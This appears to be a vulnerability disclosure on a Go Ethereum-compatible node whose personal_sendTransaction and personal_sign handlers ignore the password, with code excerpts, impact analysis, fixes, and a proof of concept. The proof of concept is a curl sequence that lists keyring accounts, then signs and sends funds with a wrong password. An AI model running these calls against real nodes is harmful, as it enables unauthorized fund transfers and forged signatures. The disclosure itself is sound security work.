### Title
`personal_sendTransaction` and `personal_sign` Silently Discard Password Parameter, Enabling Unauthorized Signing Without Authentication - (File: `rpc/namespaces/ethereum/personal/api.go`)

### Summary

The `personal_sendTransaction` and `personal_sign` JSON-RPC handlers accept a password parameter per the Ethereum `personal_` namespace specification, but both implementations silently discard it. Any caller who can reach the JSON-RPC endpoint can sign arbitrary data or broadcast transactions using any key held in the node's keyring without supplying the correct password.

### Finding Description

In `rpc/namespaces/ethereum/personal/api.go`, both signing-related handlers accept a `string` password argument that is immediately discarded via the blank identifier `_`:

```go
// personal_sendTransaction
func (api *PrivateAccountAPI) SendTransaction(
    _ context.Context, args evmtypes.TransactionArgs, _ string,  // password ignored
) (common.Hash, error) {
    api.logger.Debug("personal_sendTransaction", "address", args.To.String())
    return api.backend.SendTransaction(args)   // no password check
}

// personal_sign
func (api *PrivateAccountAPI) Sign(
    _ context.Context, data hexutil.Bytes, addr common.Address, _ string,  // password ignored
) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)   // no password check
}
``` [1](#0-0) [2](#0-1) 

The docstring for `Sign` explicitly states *"The key used to calculate the signature is decrypted with the given password"*, and the docstring for `SendTransaction` states *"If the given password isn't able to decrypt the key it fails"* — but neither implementation enforces this contract. [3](#0-2) 

The backend `Sign` function proceeds directly to `b.clientCtx.Keyring.SignByAddress(...)` without any password verification step: [4](#0-3) 

Similarly, `SendTransaction` signs and broadcasts the transaction directly via the keyring: [5](#0-4) 

The `personal` namespace is registered with `Public: false` in the API registry, but in the go-ethereum RPC framework this flag only controls IPC vs HTTP exposure — it does not add any authentication layer. The namespace is fully reachable over HTTP when enabled. [6](#0-5) 

Additionally, `personal_lockAccount` and `personal_unlockAccount` are both stubs that always return `false, nil` without error, meaning the account-locking mechanism that is supposed to gate signing is entirely non-functional: [7](#0-6) 

### Impact Explanation

An attacker who can reach the JSON-RPC endpoint (e.g., a process on the same host, or a remote caller if the endpoint is exposed) can:

1. Call `personal_sendTransaction` with any `from` address whose key exists in the node's keyring, supplying an empty or wrong password. The transaction will be signed with the node's private key and broadcast to the network, transferring funds or executing contract calls on behalf of the key owner without their knowledge.
2. Call `personal_sign` to obtain a valid ECDSA signature over arbitrary data for any key in the keyring, without knowing the password. This signature can be used in phishing, off-chain authorization schemes, or EIP-712 typed-data flows.

This constitutes an **authorization bypass enabling unauthorized account mutation and fund transfer** via the public JSON-RPC path.

### Likelihood Explanation

The `personal` namespace is not enabled by default (default namespaces are `eth`, `net`, `web3`), which reduces exposure. However, operators who explicitly enable it — a common configuration for development nodes and some production setups — are fully exposed. The attack requires only network access to the JSON-RPC port and knowledge of an address whose key is in the keyring (obtainable via `personal_listAccounts`). No cryptographic material or privileged access is needed beyond reaching the endpoint.

### Recommendation

- In `personal_sendTransaction` and `personal_sign`, validate the supplied password against the keyring before proceeding. If the underlying keyring backend does not support per-call password verification, return an explicit error rather than silently ignoring the parameter.
- Implement `personal_lockAccount` / `personal_unlockAccount` properly, or return a clear `not supported` error from `personal_sendTransaction` and `personal_sign` when the account is locked.
- Document clearly that the `personal` namespace must not be exposed to untrusted callers until password enforcement is implemented.
- Consider removing or deprecating the `personal` namespace in favor of client-side signing flows.

### Proof of Concept

```
# 1. Discover keys in the keyring (no auth required)
curl -X POST http://localhost:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# Returns: ["0xVICTIM_ADDRESS", ...]

# 2. Sign arbitrary data with the victim's key — wrong password accepted silently
curl -X POST http://localhost:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_sign",
       "params":["0xdeadbeef","0xVICTIM_ADDRESS","WRONG_PASSWORD"],"id":2}'
# Returns a valid 65-byte ECDSA signature

# 3. Send a transaction from the victim's key — wrong password accepted silently
curl -X POST http://localhost:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_sendTransaction",
       "params":[{"from":"0xVICTIM_ADDRESS","to":"0xATTACKER","value":"0x1"},"WRONG_PASSWORD"],"id":3}'
# Returns a transaction hash; funds transferred without owner consent
```

The password `"WRONG_PASSWORD"` is accepted because `_ string` in both handlers causes it to be discarded before any verification occurs. [1](#0-0) [2](#0-1)

func (b *Backend) SendTransaction(args evmtypes.TransactionArgs) (common.Hash, error) {
	// Look up the wallet containing the requested signer
	_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", args.GetFrom(), "error", err.Error())
		return common.Hash{}, fmt.Errorf("failed to find key in the node's keyring; %s; %s", keystore.ErrNoMatch, err.Error())
	}

	if args.ChainID != nil && (b.chainID).Cmp((*big.Int)(args.ChainID)) != 0 {
		return common.Hash{}, fmt.Errorf("chainId does not match node's (have=%v, want=%v)", args.ChainID, (*hexutil.Big)(b.chainID))
	}

	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
	if err := msg.ValidateBasic(); err != nil {
		b.logger.Debug("tx failed basic validation", "error", err.Error())
		return common.Hash{}, err
	}

	bn, err := b.BlockNumber()
	if err != nil {
		b.logger.Debug("failed to fetch latest block number", "error", err.Error())
		return common.Hash{}, err
	}

	header, err := b.CurrentHeader()
	if err != nil {
		b.logger.Debug("failed to fetch latest block header", "error", err.Error())
		return common.Hash{}, err
	}

	signer := ethtypes.MakeSigner(b.ChainConfig(), new(big.Int).SetUint64(uint64(bn)), header.Time)

	// Sign transaction
	if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil {
		b.logger.Debug("failed to sign tx", "error", err.Error())
		return common.Hash{}, err
	}

func (b *Backend) Sign(address common.Address, data hexutil.Bytes) (hexutil.Bytes, error) {
	from := sdk.AccAddress(address.Bytes())

	_, err := b.clientCtx.Keyring.KeyByAddress(from)
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", address.String())
		return nil, fmt.Errorf("%s; %s", keystore.ErrNoMatch, err.Error())
	}

	// Apply EIP-191 signed-message prefix to domain-separate personal
	// signatures from transaction signatures (matching Geth's eth_sign).
	signature, _, err := b.clientCtx.Keyring.SignByAddress(from, accounts.TextHash(data), signingtypes.SignMode_SIGN_MODE_TEXTUAL)
	if err != nil {
		b.logger.Error("keyring.SignByAddress failed", "address", address.Hex())
		return nil, err
	}

	signature[crypto.RecoveryIDOffset] += 27 // Transform V from 0/1 to 27/28 according to the yellow paper
	return signature, nil
}
